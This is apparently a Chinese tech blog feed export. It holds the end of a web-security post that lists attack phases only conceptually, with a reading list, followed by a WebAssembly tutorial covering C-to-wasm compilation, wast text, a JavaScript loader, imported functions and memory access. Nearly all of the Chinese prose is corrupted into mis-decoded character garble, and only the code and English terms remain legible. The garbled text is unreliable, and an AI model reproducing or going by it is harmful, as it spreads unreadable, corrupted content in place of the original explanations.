åµæŸ¥ï¼ˆReconnaissanceï¼‰æ”»æ“Šè€…æº–å‚™æ”»æ“Šä¹‹å‰é€²è¡Œçš„èª¿æŸ¥ï¼Œä½¿ç”¨ Google æˆ–æ˜¯ç¤¾äº¤å·¥ç¨‹æ‰¾å°‹ç›®æ¨™çš„ç›¸é—œè³‡è¨Šï¼Œä»¥åˆ©ä¹‹å¾Œçš„æ”»æ“Š

æƒæï¼ˆScanningï¼‰æƒæç›®æ¨™ä¸»æ©Ÿçš„å¼±é»ï¼Œå–å¾—ä¸»æ©Ÿä½œæ¥­ç³»çµ±ã€æœå‹™å’Œé‹ä½œç‹€æ³ç­‰ç›¸é—œè³‡è¨Š

å–å¾—æ¬Šé™ï¼ˆGaining Accessï¼‰åˆ©ç”¨ç³»çµ±å¼±é»å–å¾—ä¸»æ©Ÿæ¬Šé™

ç¶­æŒæ¬Šé™ï¼ˆMaintaining Accessï¼‰ç¶­æŒç›®å‰å–å¾—çš„æ¬Šé™ï¼Œä»¥ä¾¿æ—¥å¾Œå†æ¬¡å­˜å–è€Œä¸éœ€ç¹é›œçš„æ­¥é©Ÿ

æ¸…é™¤è¶³è·¡ï¼ˆClearing Tracksï¼‰æ¸…é™¤å…¥ä¾µçš„ç—•è·¡


ç¸½çµä»¥ä¸Šæ•´ç†ä¸€äº› Web å¸¸è¦‹è³‡è¨Šå®‰å…¨ï¼ˆSecurityï¼‰çš„è­°é¡Œå’Œå­¸ç¿’è³‡æºå’Œè®€è€…ä¸€èµ·æ•™å­¸ç›¸é•·ï¼Œæˆç‚ºä¸€å€‹å¥½çš„ç™½å¸½é§­å®¢ï¼ˆWhite Hat Hackerï¼‰ã€‚éš¨è‘—ç¶²è·¯ç§‘æŠ€çš„ç™¼å±•ï¼Œè³‡è¨Šå®‰å…¨çš„è­°é¡Œåªæœƒè¶Šä¾†è¶Šé‡è¦ï¼Œç•¶ä¸‹æ¬¡ç•¶æœ‰ç”¢å“è¦ä¸Šç·šåˆ°æ­£å¼ç’°å¢ƒæ™‚ï¼Œä¸å¦¨ä½¿ç”¨ The Security Checklist ç¢ºèªä¸€ä¸‹æœ‰å“ªäº›è³‡å®‰æ³¨æ„äº‹é …æ˜¯æˆ‘å€‘æ²’æœ‰æ³¨æ„åˆ°çš„ã€‚
å»¶ä¼¸é–±è®€
Web Security ç¶²ç«™å®‰å…¨åŸºç¤ç¯‡ï¼ˆä¸€ï¼‰
Web Securityç¶²ç«™å®‰å…¨åŸºç¤ç¯‡ï¼ˆäºŒï¼‰
3å€‹å…è²»çš„ Webè³‡è¨Šå®‰å…¨è‡ªå‹•åŒ–æ¸¬è©¦å·¥å…·
HITCON 2016 æŠ•å½±ç‰‡ - Bug Bounty çé‡‘çµäººç”˜è‹¦è«‡ é‚£äº›å¹´æˆ‘å›å ±éçš„æ¼æ´
FallibleInc&#x2F;security-guide-for-developers
[è³‡è¨Šå®‰å…¨]é˜²ç¯„Cross-Site-Scripting(XSS)
ç¶²ç«™é˜²ç¯„XSSæ”»æ“Šçš„é—œéµæ€è€ƒ

é—œæ–¼ä½œè€…ï¼š@kdchang æ–‡è—å‹é–‹ç™¼è€…ï¼Œå¤¢æƒ³æ˜¯åšå‡ºäººå€‘æƒ³ç”¨çš„ç”¢å“å’Œè¾¦ä¸€æ‰€å¿ƒç›®ä¸­ç†æƒ³çš„å­¸æ ¡ï¼Œç›®å‰å°ˆæ³¨åœ¨ Mobile å’Œ IoT æ‡‰ç”¨é–‹ç™¼ã€‚A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>Web, Security</tag>
      </tags>
  </entry>
  <entry>
    <title>äº†è§£ WebAssembly çš„åŸºç¤ä½¿ç”¨æ–¹æ³•</title>
    <url>/2017/06/17/webassembly-js-future/</url>
    <content><![CDATA[å‰è¨€æ™‚é–“éå¾—å¾ˆå¿«ï¼Œè¨˜å¾—ç¬¬ä¸€æ¬¡è½åˆ° WebAssembly é€™å€‹åè©æ˜¯åœ¨ 2015 å¹´ï¼Œå°å¼Ÿé‚„åœ¨æœå½¹â€¦ç•¶æ™‚çœ‹åˆ°çš„æ–‡ç« ä»¥è³å‹•çš„æ¨™é¡Œè¨´èªªè‘— JavaScript å³å°‡è¦è¢«å–ä»£ï¼Œå„å®¶å¤§å» ç´›ç´›æŠ•å…¥é–‹ç™¼â€¦ï¼ˆæˆ‘å°±ä¸è½‰è²¼é€™ç¨®æ–‡ç« äº†ï¼‰å®³æˆ‘æƒ³èªªæ˜¯ä¸æ˜¯é€€å½¹å¾Œæœƒæ‰¾ä¸åˆ°å·¥ä½œâ€¦
é‚„å¥½è¨˜è€…èªªçš„ç¸½æ˜¯ä¸ä¸€å®šå°ï¼ŒWebAssembly ç•¶ç„¶ä¸æ˜¯ä¾†å–ä»£ JavaScript çš„ï¼Œå¯ä»¥çœ‹çœ‹ JavaScript çš„ç™¼æ˜äºº Brendan Eich æ€éº¼èªª ä»¥åŠ ä»–åœ¨ Fluent conference çš„ keynoteã€‚
ä½†å³ä¾¿çŸ¥é“ WebAssembly ä¸¦éè¦å–ä»£ JavaScriptï¼Œæˆ‘å…¶å¯¦ä¹Ÿé‚„æ˜¯ä¸€ç›´æä¸å¤ªæ‡‚èº«ç‚ºé–‹ç™¼è€…ï¼Œåˆ°åº•è¦å¦‚ä½•ä½¿ç”¨ WebAssemblyï¼ŒåªçŸ¥é“å®ƒä¼¼ä¹è®“ C&#x2F;C++ è·‘åœ¨ Browser ä¸Šé€™ä»¶äº‹è®Šæˆå¯è¡Œï¼Œä¹Ÿèƒ½å¤§å¹…æå‡ JavaScript çš„æ•ˆèƒ½ã€‚
ç›´åˆ°å‰é™£å­ç™¼ç¾ä¸€éƒ¨é™æ™‚å…è²»çš„æ•™å­¸å½±ç‰‡ - Get Started Using WebAssembly (wasm)ï¼Œæˆ‘æ‰ç¨ç¨é ˜æ‚Ÿäº†ä¸€äº›ã€‚é€™éƒ¨ç”± Guy Bedford è£½ä½œçš„å½±ç‰‡åœ¨ egghead.io ä¸Šï¼ŒçŸ­çŸ­ 56 åˆ†é˜ï¼Œä»¥å¯¦éš›ç¯„ä¾‹å‘Šè¨´ä½ å¦‚ä½•ä½¿ç”¨ WebAssemblyï¼Œä»¥åŠèˆ‡ JS é€²è¡Œæ•ˆèƒ½æ¯”è¼ƒï¼Œä¹Ÿä»‹ç´¹äº†è¨±å¤šæ–¹ä¾¿ä½ æ¸¬è©¦çš„å·¥å…·ï¼Œæœ‰æ™‚é–“çš„è©±æˆ‘å¼·çƒˆæ¨è–¦æŠŠå®ƒçœ‹å®Œï¼Œä¸éç¾åœ¨å·²ç¶“è¦æ˜¯ egghead çš„ pro member æ‰èƒ½çœ‹å¾—åˆ°äº†â€¦ (ä½œè€…æœ‰ open source ä»–æ‰€æœ‰çš„ç¯„ä¾‹ code åœ¨ guybedford&#x2F;wasm-intro èˆ‡ guybedford&#x2F;wasm-demo)
å¯èƒ½ä½ æ²’æœ‰æ™‚é–“ä¹Ÿæ²’æœ‰å¤šé¤˜çš„éŒ¢èƒ½ä»˜è²»è§€çœ‹ï¼Œä½†æ²’é—œä¿‚ï¼Œå¸Œæœ›æ†‘è‘—æˆ‘çš„è¨˜æ†¶ï¼Œé€éé€™ç¯‡æ–‡ç« èåˆä¸€äº›å½±ç‰‡çš„é‡é»ï¼Œè®“å¤§å®¶å¿«é€Ÿäº†è§£ WebAssembly æ˜¯ä»€éº¼ï¼Œä»¥åŠè¦å¦‚ä½•èˆ‡ JavaScript æ­é…ä½¿ç”¨ã€‚
ä»€éº¼æ˜¯ WebAssembly (wasm)ï¼Ÿ
WebAssembly or wasm is a new, portable, size- and load-time-efficient format suitable for compilation to the web. â€“ WebAssembly Design


ä¸€ç¨®äºŒé€²ä½è¡¨ç¤ºçš„æ–°èªè¨€ï¼Œä½†æœ‰å¦å¤–çš„ text format å¯ä»¥è®“ä½ ç·¨è¼¯èˆ‡ debugã€‚

Compile Targetï¼šé¡§åæ€ç¾©ï¼Œåªè¦é€éç‰¹å®šçš„ Compilerï¼Œä½ å°±èƒ½å°‡ä½ è‡ªå·±æ…£ç”¨çš„èªè¨€ç·¨è­¯æˆ WebAssemblyï¼Œç„¶å¾ŒåŸ·è¡Œåœ¨ç€è¦½å™¨ä¸Šï¼ç›®å‰å¯ä»¥é€é Emscripten(LLVM to JS compiler) ä¾†ç·¨è­¯ C&#x2F;C++ çš„ç¨‹å¼ã€‚

æä¾›å¢å¼· JavaScript ç¨‹å¼çš„æ–¹æ³•ï¼šä½ å¯ä»¥å°‡ performance critical çš„ç¨‹å¼éƒ¨åˆ†ç”¨ WebAssembly æ’°å¯«ï¼Œæˆ–æ˜¯ç”¨ç¬¬ 2 é»æåŠçš„ C&#x2F;C++ç·¨è­¯æˆ WebAssemblyï¼Œç„¶å¾Œåƒä¸€èˆ¬ import js module ä¸€èˆ¬ï¼Œå°å…¥ä½ çš„ JavaScript Applicationã€‚é€é WebAssemblyï¼Œä½ èƒ½å¤ è‡ªç”±æ§åˆ¶ Memory çš„å­˜å–èˆ‡é‡‹æ”¾ã€‚

ç•¶ Browser èƒ½å¤ æ”¯æ´é‹è¡Œ WebAssembly çš„æ™‚å€™ï¼Œç”±æ–¼äºŒé€²ä½æ ¼å¼ä»¥åŠäº‹å…ˆç·¨è­¯èˆ‡å„ªåŒ–çš„é—œä¿‚ï¼Œå‹¢å¿…èƒ½å¤ ç”¢ç”Ÿæ¯” JavaScript é‹è¡Œé€Ÿåº¦æ›´å¿«ã€æª”æ¡ˆå¤§å°æ›´å°çš„çµæœã€‚

èªè¨€çš„å®‰å…¨æ€§ WebAssembly ç•¶ç„¶ä¹Ÿå¾ˆé‡è¦–ï¼Œåœ¨ JavaScript VM ä¸­ï¼Œ WebAssembly é‹è¡Œåœ¨ä¸€å€‹æ²™ç®±åŒ–çš„åŸ·è¡Œç’°å¢ƒï¼Œé·å…¥ web ç«¯é‹è¡Œæ™‚æœƒå¼·åˆ¶ä½¿ç”¨ Browser çš„ Same-Origin å’Œ permissions security policiesã€‚æ­¤å¤–ï¼Œwasm çš„å¯¦ä½œè¨­è¨ˆä¸­æ›´ç‰¹åˆ¥æåŠä»–æ˜¯ memory-safe çš„ã€‚

Non-Web Embeddingsï¼šé›–ç„¶æ˜¯ç‚ºäº† Web è¨­è¨ˆï¼Œä½†ä¹Ÿå¸Œæœ›èƒ½åœ¨å…¶ä»–ç’°å¢ƒä¸­é‹è¡Œï¼Œå› æ­¤åº•å±¤å¯¦ä½œä¸¦æ²’æœ‰ require Web APIï¼Œè®“å…¶æ“æœ‰è‰¯å¥½çš„ portabilityï¼Œä¸ç®¡æ˜¯ Nodejs, IoT devices éƒ½å¯ä½¿ç”¨ã€‚


WebAssembly ç›®å‰ç”± W3C Community Group è¨­è¨ˆé–‹ç™¼ï¼Œæˆå“¡åŒ…å«æ‰€æœ‰ major browsers çš„ä»£è¡¨ã€‚
WebAssembly æœ‰è¨±å¤š High-Level Goalsï¼Œç›®å‰ release çš„ç‰ˆæœ¬ä¸»è¦ç‚º MVP(Minimum Viable Product)ï¼Œæä¾›å…ˆå‰ asm.js çš„å¤šæ•¸åŠŸèƒ½ï¼Œä¸¦å…ˆä»¥ C&#x2F;C++ çš„ç·¨è­¯ç‚ºä¸»ã€‚
ç­‰ç­‰ï¼Œç¬¬ä¸€é»å°±æœ‰å•é¡Œäº†ï¼Œä½ èªªä»–æ˜¯äºŒé€²ä½è¡¨ç¤ºçš„èªè¨€ï¼Œé‚£è©²æ€éº¼å¯«ï¼Ÿï¼text format åˆæ˜¯é•·ä»€éº¼æ¨£å­ï¼Ÿå•å¾—å¥½ï¼Œé€™å°±æ˜¯æœ¬ç¯‡çš„é‡é»ï¼ŒWebAssembly çš„æª”æ¡ˆæ ¼å¼ç‚º wasmï¼Œèˆ‰ä¸€å€‹ä¾‹å­ä¾†çœ‹ï¼Œä¸€å€‹ç”¨ c++ æ’°å¯«çš„åŠ æ³•å‡½æ•¸ï¼š
add.c#include &lt;math.h&gt;int add(int num1, int num2) &#123;    return num1 + num2;&#125;


è‹¥ç·¨è­¯ç‚º wasm æœƒé•·é€™å€‹æ¨£å­ï¼ˆç‚ºç¯€çœç©ºé–“æˆ‘è½‰æˆ Hexï¼‰ï¼š
add.wasm00 61 73 6d 01 00 00 00  01 87 80 80 80 00 01 6002 7f 7f 01 7f 03 82 80  80 80 00 01 00 04 84 8080 80 00 01 70 00 00 05  83 80 80 80 00 01 00 0106 81 80 80 80 00 00 07  95 80 80 80 00 02 06 6d65 6d 6f 72 79 02 00 08  5f 5a 33 61 64 64 69 6900 00 0a 8d 80 80 80 00  01 87 80 80 80 00 00 2001 20 00 6a 0b

ç•¶ç„¶æˆ‘å€‘å¾ˆé›£å»ç·¨è¼¯é€™æ¨£çš„æ±è¥¿ï¼Œæ‰€ä»¥æœ‰å¦ä¸€ç¨® text format å«åš wastï¼Œä¸Šè¿°çš„ .wasm è½‰æˆ .wast å¾Œï¼š
add.wast(module  (table 0 anyfunc)  (memory $0 1)  (export &quot;memory&quot; (memory $0))  (export &quot;add&quot; (func $add))  (func $add (param $0 i32) (param $1 i32) (result i32)    (i32.add      (get_local $1)      (get_local $0)    )  ))

é€™æ¨£å°±å¥½æ‡‚å¤šäº†ï¼Œæˆ‘å€‘ä¸€è¡Œä¸€è¡Œä¾†è§£é‡‹ï¼š
line 1 çš„ module å°±æ˜¯ WebAssembly ä¸­ä¸€å€‹å¯è¼‰å…¥ã€å¯åŸ·è¡Œçš„æœ€å°å–®ä½ç¨‹å¼ï¼Œåœ¨ runtime è¼‰å…¥å¾Œå¯ä»¥ç”¢ç”Ÿ Instance ä¾†åŸ·è¡Œï¼Œè€Œé€™å€‹ module ä¹Ÿæœè‘—èˆ‡ ES6 modules æ•´åˆçš„æ–¹å‘ï¼Œä¹Ÿå°±æ˜¯èªªä»¥å¾Œèƒ½é€é &lt;script src=&quot;abc.wasm&quot; type=&quot;module&quot; /&gt; çš„æ–¹å¼è¼‰å…¥ã€‚
line 2 ~ 3 åˆ†åˆ¥å®£å‘Šäº†å…©å€‹é è¨­çš„ç’°å¢ƒè®Šé‡: memory èˆ‡ tableï¼Œmemory å°±æ˜¯å­˜æ”¾è®Šæ•¸çš„è¨˜æ†¶é«”ç‰©ä»¶ï¼Œè€Œ table å‰‡æ˜¯ WebAssembly ç”¨ä¾†å­˜æ”¾ function reference çš„åœ°æ–¹ï¼Œåœ¨ç›®å‰ MVP çš„ç‰ˆæœ¬ä¸­ï¼Œtable çš„ element type åªèƒ½ç‚º anyfuncã€‚
æ¥è‘— line 4 ~ 5 æŠŠ memory èˆ‡ add function export å‡ºå»ã€‚ä¹‹å¾Œåœ¨ JavaScript ä¸­ï¼Œæˆ‘å€‘å¯ä»¥å–å¾—é€™å…©å€‹è¢« export å‡ºä¾†çš„ç‰©ä»¶èˆ‡å‡½å¼ã€‚
æœ€å¾Œæ˜¯åŠ æ³•å‡½å¼çš„å®£å‘Šèˆ‡å¯¦ä½œå…§å®¹ï¼Œå…¶ä¸­ get_local æ˜¯ WebAssembly ä¸­å–å¾— memory ä¸­ local è®Šæ•¸çš„æ–¹æ³•ã€‚
ä¸çŸ¥é“æœƒä¸æœƒæœ‰äººå¥½å¥‡ i32 æ˜¯ä»€éº¼ï¼Ÿ
i32 æŒ‡çš„å°±æ˜¯ 32ä½å…ƒçš„æ•´æ•¸ï¼Œåœ¨ WebAssembly çš„ä¸–ç•Œä¸­ï¼Œæ˜¯å¼·å‹æ…‹çš„ï¼Œå¿…é ˆæ˜ç¢ºæŒ‡å®šè®Šæ•¸å‹æ…‹ï¼Œå¯«ç¿’æ…£ JS çš„è¦å¤šåŠ æ³¨æ„ã€‚

é‚£åˆ°åº•æ€éº¼å°‡ C&#x2F;C++ ç·¨è­¯æˆ wasm æˆ– wast å‘¢ï¼ŸWebAssembly.org ä¸­ä»‹ç´¹æˆ‘å€‘ä½¿ç”¨ Emscriptenï¼ŒEmscripten çš„å®‰è£èˆ‡ä½¿ç”¨æ–¹æ³•å¤§å®¶å¯ä»¥å¾å®˜ç¶²ä¸Šçœ‹åˆ°ï¼Œå°±ä¸è´…è¿°ã€‚
å®‰è£å¥½å¾ŒåŸ·è¡Œ emcc add.c -s WASM=1 -o add.html å³å¯ï¼Œå”¯ä¸€è¦æ³¨æ„çš„æ˜¯ WASM=1 é€™å€‹ flag è¦è¨­å®šï¼Œå¦å‰‡ emcc é è¨­æœƒè·‘ asm.jsã€‚
å¦‚æœåªæ˜¯æƒ³åšé®®ä¸€ä¸‹ï¼Œå¯èƒ½çœ‹åˆ°è¦å®‰è£é€™äº›æ±è¥¿å°±æœƒæŠŠç¶²é é—œæ‰äº†â€¦
ä¸éä¸ç”¨æ“”å¿ƒï¼ç¾åœ¨ä¹Ÿå·²ç¶“æœ‰å¾ˆæ–¹ä¾¿çš„ online tool å¯ä»¥ä½¿ç”¨ï¼š
WasmFiddle


WasmFiddle å¯ä»¥å¹«ä½ æŠŠ C code è½‰æˆ Wast èˆ‡ Wasm (å¯ä¸‹è¼‰)ï¼Œç„¶å¾ŒåŒæ™‚è®“ä½ ç›´æ¥åˆ©ç”¨ JS é€²è¡Œæ“ä½œï¼Œç¼ºé»æ˜¯æ²’è¾¦æ³•ç›´æ¥æ›´æ”¹ Wastã€‚
WasmExplorerï¼š


WasmExplorer ä¸€æ¨£èƒ½å¹«ä½ æŠŠ C code ç·¨è­¯æˆ Wast èˆ‡ Wasmï¼Œä¸¦ä¸”å¯ä»¥ç·¨è¼¯è½‰å‡ºä¾†çš„ Wastï¼Œç¼ºé»æ˜¯æ²’æœ‰ JS èƒ½ç›´æ¥äº’å‹•ã€‚
æ‰€ä»¥æ­é…æ“ä½œçš„æµç¨‹â€¦
å…ˆ WasmFiddle ä¾†é€²è¡Œæ¸¬è©¦ï¼Œæ¥è‘—æŠŠç·¨å¥½çš„ Wast è¤‡è£½åˆ° WasmExplorer é€²è¡Œä½ æƒ³è¦çš„ç·¨è¼¯ï¼Œæ¥è‘—å† compile æˆ wasm ä¸¦ä¸‹è¼‰ä¸‹ä¾†ã€‚



çŸ¥é“æ€éº¼ç·¨è­¯ wasm å¾Œï¼Œè©²èªªèªª JavaScript äº†å§å¥½çš„ï¼Œä½†åœ¨é‚£ä¹‹å‰ï¼Œè¦å…ˆæé†’å¤§å®¶ï¼Œé™¤äº† Chrome 57, Firefox 52 é è¨­æ”¯æ´ WebAssembly å¤–ï¼ŒSafari éœ€è¦æ˜¯ç´«è‰²ç‰ˆæœ¬ï¼ˆPreview ç‰ˆï¼‰æ‰èƒ½ä½¿ç”¨ï¼Œè€Œ Edge 15 å‰‡æ˜¯è¦é–‹å•Ÿ Experimental JavaScript Featuresã€‚
è¼‰å…¥ wasm åˆ° Web ç«¯åœ¨ &lt;script src=&quot;abc.wasm&quot; type=&quot;module&quot; /&gt; é‚„ç„¡æ³•ä½¿ç”¨ä¹‹å‰ï¼Œæƒ³è¦è¼‰å…¥ wasm å¿…é ˆé€é fetch APIã€‚åœ¨ Guy bedford çš„å½±ç‰‡ç¯„ä¾‹ èˆ‡ mdn çš„ example ä¸­çš„å¯«æ³•éƒ½å·®ä¸å¤šï¼š
wasm-loader.jsfunction fetchAndInstantiateWasm (url, imports) &#123;    return fetch(url) // url could be your .wasm file    .then(res =&gt; &#123;    if (res.ok)        return res.arrayBuffer();    throw new Error(`Unable to fetch Web Assembly file $&#123;url&#125;.`);    &#125;)    .then(bytes =&gt; WebAssembly.compile(bytes))    .then(module =&gt; WebAssembly.instantiate(module, imports || &#123;&#125;))    .then(instance =&gt; instance.exports);&#125;

åŸºæœ¬ä¸Šæœƒå¯¦ä½œä¸€å€‹ wasm-loader ä¹‹é¡çš„å‡½å¼ï¼Œåƒä¸Šé¢çš„ fetchAndInstantiateWasmã€‚
å…§å®¹å¾ˆç°¡å–®ï¼Œå–å¾— fetch å›ä¾†çš„ result å¾Œï¼Œå°‡å…¶è½‰ç‚º ArrayBufferï¼Œåˆ©ç”¨ WebAssembly.compile é€™å€‹ Web API ä¾†ç”¢ç”Ÿ WebAssembly Moduleï¼Œæ¥è‘—é€é WebAssembly.instantiate ä¾†ç”¢ç”Ÿ module instanceï¼Œæœ€å¾Œçš„ instance.exports å°±æ˜¯æˆ‘å€‘åœ¨ wasm ä¸­ export å‡ºä¾†çš„ç‰©ä»¶æˆ– functionã€‚
é™¤äº† fetch ä»¥å¤–ï¼ŒWebAssembly.compile èˆ‡ WebAssembly.instantiate ä¹Ÿéƒ½æ˜¯å›å‚³ Promiseã€‚
é€™é‚Šå‡ºç¾ä¸€å€‹ç›¸ä¿¡ä¸€èˆ¬å‰ç«¯é–‹ç™¼è€…ä¹Ÿæ¯”è¼ƒå°‘çœ‹åˆ°çš„ ArrayBufferã€‚
ArrayBuffer æ˜¯ JavaScript çš„ä¸€ç¨® data typeï¼Œç”¨ä¾†è¡¨ç¤º generic, fixed-length çš„ binary data bufferï¼Œå±¬æ–¼ typed arrays çš„ä¸€éƒ¨åˆ†ï¼Œè€Œé—œæ–¼ typed arrays é›–ç„¶åœ¨ WebAssembly ä¸­å¾ˆé‡è¦ï¼Œä½†æ˜¯é›£ä»¥åœ¨é€™é‚Šè©³è¿°ï¼Œmdn çš„æ–‡ä»¶å¯«å¾—å¾ˆæ¸…æ¥šï¼Œå€¼å¾—é–±è®€ã€‚
æˆ‘å€‘ç›®å‰åªè¦çŸ¥é“ä»–æ˜¯ä¸€å€‹ array-like çš„ç‰©ä»¶ï¼Œè®“æˆ‘å€‘èƒ½åœ¨ JavaScript ä¸­å­˜å– raw binary dataï¼Œæœ‰ Int8Arrayã€Int32Array èˆ‡ Float32Array ç­‰ DataView å¯ä»¥ä½¿ç”¨å³å¯ã€‚ï¼ˆåˆä¸€å€‹åè©â€¦DataView æä¾› getter&#x2F;setter API ä¾†å° buffer ä¸­çš„ data åšè®€å–ã€‚ï¼‰
å›åˆ°ä¸»é¡Œï¼Œå¦‚æœä½ å‰›å‰›æœ‰å…ˆé»é€² mdn çš„ example çœ‹ï¼Œå¯èƒ½æœƒç™¼ç¾ä»–æ€éº¼æ²’æœ‰ WebAssembly.compile é€™å€‹æ­¥é©Ÿï¼Ÿ
å¯¦éš›ä¸Š WebAssembly.instantiate æœ‰å…©ç¨® overload å¯¦ä½œï¼š

Promise&lt;ResultObject&gt; WebAssembly.instantiate(bufferSource, importObject);
Promise&lt;WebAssembly.Instance&gt; WebAssembly.instantiate(module, importObject);

å·®åˆ¥åœ¨æ–¼ï¼Œå…ˆé€é WebAssembly.compile å¾Œç”¢ç”Ÿçš„ WebAssembly moduleï¼Œå¯ä»¥å­˜åœ¨ indexedDB ä¸­ cacheï¼Œæˆ–æ˜¯åœ¨ web workers ä¹‹é–“å‚³éã€‚
æ­¤å¤–ï¼ŒWebAssembly.Instance çš„ç¬¬äºŒå€‹åƒæ•¸ï¼šimportObject æ˜¯ç”¨ä¾†å‚³é JavaScript çš„åƒæ•¸æˆ– function åˆ° WebAssembly ç¨‹å¼ä¸­ä½¿ç”¨ï¼Œå¾Œé¢æœƒæœ‰ç¯„ä¾‹ã€‚ 
åœ¨ JavaScript ä¸­ä½¿ç”¨ WebAssembly å¯¦ä½œçš„ functionæœ‰äº†å‰›å‰›çš„ fetchAndInstantiateWasmï¼Œå–å¾— WebAssembly function å¾ˆæ–¹ä¾¿ï¼š
fetchAndInstantiateWasm(&#x27;add.wasm&#x27;, &#123;&#125;)    .then(m =&gt; &#123;      console.log(m.add(5, 10)); // 15    &#125;);

ä½¿ç”¨ä¸Šå°±æ˜¯é€™éº¼ç°¡å–®ï¼
é‚£èƒ½ä¸èƒ½åœ¨ WebAssembly ä¸­ä½¿ç”¨ JavaScript å¯«çš„ function å‘¢ï¼Ÿç•¶ç„¶å¯ä»¥ï¼å°±æ˜¯é€éæ–¹æ‰æ‰€èªªçš„ç¬¬äºŒå€‹åƒæ•¸ importObjectã€‚
å‡è¨­æˆ‘å€‘æƒ³è¦åœ¨å‰›å‰›çš„åŠ æ³•å‡½æ•¸å…§é€²è¡Œ JS çš„ console.logï¼š
add.c#include &lt;math.h&gt;void consoleLog (int num);int add(int num1, int num2) &#123;    int result = num1 + num2;    consoleLog(result);    return result;&#125;

å…ˆå®£å‘Šä¸€å€‹ consoleLog å‡½å¼ï¼Œä¸¦ä¸éœ€è¦å¯¦ä½œä»–ï¼Œå› ç‚ºé€™æœƒæ˜¯æˆ‘å€‘å¾…æœƒè¦å¾ JavaScript é‚£é‚Š import é€²ä¾†çš„éƒ¨åˆ†ï¼š
fetchAndInstantiateWasm(&#x27;./add.wasm&#x27;, &#123;    env: &#123;        consoleLog: num =&gt; console.log(num)    &#125;&#125;).then(m =&gt; &#123;    m.add(5, 3) // console.log 8&#125;);

åœ¨å‰›å‰›çš„ fetchAndInstantiateWasm çš„ç¬¬äºŒå€‹åƒæ•¸ä¸­ï¼Œæˆ‘å€‘å®šç¾©ä¸€å€‹ env objectï¼Œä¸¦å‚³å…¥ä¸€å€‹å…§å« console.log çš„å‡½å¼ã€‚env æ˜¯ä¸€å€‹ç‰¹æ®Šçš„ keyï¼Œåœ¨å‰›å‰›çš„ add.c ç•¶ä¸­ï¼Œæˆ‘å€‘å®£å‘Šçš„ void consoleLog (int num) è½‰æ›åˆ° add.wast æ™‚ï¼Œä»–æœƒç•¶ä½œé€™å€‹å‡½å¼æ˜¯å¾ env ä¸­ import é€²å…¥çš„ï¼ˆline 2ï¼‰ï¼š
add.wast(module  (type $FUNCSIG$vi (func (param i32)))  (import &quot;env&quot; &quot;consoleLog&quot; (func $consoleLog (param i32)))  // ...å‡½æ•¸å…§å®¹çœç•¥ï¼Œå¯åƒè€ƒå‰é¢çš„ç¯„ä¾‹)

é›£é“åªèƒ½å¾ env è¼‰å…¥å—ï¼Ÿç•¶ç„¶ä¸æ˜¯ï¼Œæˆ‘å€‘ä¹Ÿå¯ä»¥è‡ªå·±å®šç¾©ï¼Œä½†å°±è¦å»æ›´æ”¹ wast æª”æ¡ˆäº†ï¼Œå…¶å¯¦æ”¹éä»¥å¾Œæœƒç™¼ç¾é‚è¼¯ä¸é›£æ‡‚ï¼Œæœ‰è®“æˆ‘å›å‘³åˆ°å¤§å­¸ä¿®çµ„èªçš„æ„Ÿè¦ºâ€¦
add-10-20.wast(module  (type $FUNCSIG$vi (func (param i32)))  (import &quot;env&quot; &quot;consoleLog&quot; (func $consoleLog (param i32)))  ++(import &quot;lib&quot; &quot;log&quot; (func $log (param i32)))  (table 0 anyfunc)  (memory $0 1)  (export &quot;memory&quot; (memory $0))  (export &quot;add&quot; (func $add))  (func $add (param $0 i32) (param $1 i32) (result i32)    (call $consoleLog // å¾ env ä¸­è¼‰å…¥çš„ consoleLog      ++(i32.add        (tee_local $1          (i32.add            (get_local $1)            (get_local $0)          )        )        ++(i32.const 20) // å¾ env è¼‰å…¥çš„ consoleLog å¤šåŠ  20      )    )    ++(call $log // å¾æˆ‘å€‘è‡ªå·±å®šç¾©çš„ lib ä¸­è¼‰å…¥çš„ log      ++(i32.add        ++(get_local $1)        ++(i32.const 10) // å¾ env è¼‰å…¥çš„ consoleLog å¤šåŠ  10      ++)    ++)    (get_local $1)  ))

å‰é¢æœ‰åŠ è™Ÿçš„å°±æ˜¯æˆ‘å€‘ç›´æ¥åœ¨ wast ä¸­ä¿®æ”¹çš„ç¨‹å¼ç¢¼ï¼Œç­‰åŒæ–¼å¦‚ä¸‹ C èªè¨€çš„ç¨‹å¼ï¼š
add.c#include &lt;math.h&gt;void consoleLog (int num);int add(int num1, int num2) &#123;    int result = num1 + num2;    consoleLog(result + 20);    log(result + 10); // å¤šäº†é€™å€‹å¾ lib åŒ¯å…¥çš„ log å‡½æ•¸    return result;&#125;


å¦‚æ­¤ä¸€ä¾†ï¼Œæˆ‘å€‘å°±èƒ½å¤ åƒä¸‹é¢é€™èˆ¬å‚³é lib.log çµ¦æˆ‘å€‘çš„ wasm ä½¿ç”¨äº†ï¼
WASM Test on jsbin.com

ç¾åœ¨æˆ‘çŸ¥é“å¦‚ä½•åœ¨ JS èˆ‡ WebAssembly ä¸­äº’ç›¸ä½¿ç”¨å‡½å¼äº†ï¼Œä½†å‰é¢å¥½åƒæœ‰æåˆ°ä»–é‚„èƒ½è®“ä½ æ“ä½œ Memory?!å‰é¢ç¯„ä¾‹ä¸­çš„ wast éƒ½æœ‰å°‡ memory export å‡ºä¾†ï¼š(export &quot;memory&quot; (memory $0))æˆ‘å€‘å¯ä»¥åˆ©ç”¨å‰é¢æåŠçš„ JavaScript Typed Array ä¾†å–å¾— memory bufferï¼Œä¸¦åˆ©ç”¨ TextDecoder é€™å€‹è¼ƒæ–°çš„ Web API ä¾†è§£ç¢¼ï¼š
const memory = wasmModule.memory;const strBuf = new Uint8Array(memory.buffer, wasmModule.getStrOffset(), 11);const str = new TextDecoder().decode(strBuf);console.log(str);

JS Bin on jsbin.com
å¯ä»¥è®€å–åˆ° memoryï¼Œç•¶ç„¶ä¹Ÿèƒ½å¯«å…¥ï¼š
function writeString (str, offset) &#123;      const strBuf = new TextEncoder().encode(str);      const outBuf = new Uint8Array(mem.buffer, offset, strBuf.length);      for (let i = 0; i &lt; strBuf.length; i++) &#123;        outBuf[i] = strBuf[i];      &#125;    &#125;

å°æ–¼ Memory çš„æ“ä½œéƒ¨åˆ†ï¼ŒGuy Bedford çš„ç¯„ä¾‹æœ‰æ›´å¤šä»‹ç´¹ï¼ŒåŒ…å«æ€éº¼æ­é… malloc ä¾†å‹•æ…‹èª¿æ•´è¨˜æ†¶é«”ã€‚


